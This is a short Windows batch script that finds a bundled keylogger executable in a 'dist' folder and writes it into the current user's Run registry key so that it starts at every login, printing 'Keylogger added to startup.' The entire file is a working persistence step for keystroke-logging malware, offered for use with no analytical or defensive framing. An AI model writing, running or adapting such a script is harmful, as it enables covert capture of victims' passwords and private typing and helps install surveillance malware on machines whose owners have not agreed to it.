@echo off

:: Enable delayed variable expansion
setlocal enabledelayedexpansion

:: Get the directory where the batch script is located
set "CURRENT_DIR=%~dp0"

:: Path to the Python keylogger executable using the current directory
set "KEYLOGGER_SCRIPT=%CURRENT_DIR%dist/keylogger.exe"

:: Check if the executable exists
if not exist "%KEYLOGGER_SCRIPT%" (
    echo Keylogger executable not found at %KEYLOGGER_SCRIPT%.
    echo Please ensure the executable is present in the script directory.
    pause
    exit /b
)

:: Add keylogger to the registry for startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v KeyLogger /t REG_SZ /d "\"%KEYLOGGER_SCRIPT%\"" /f

:: Confirm deployment
echo Keylogger added to startup.
pause
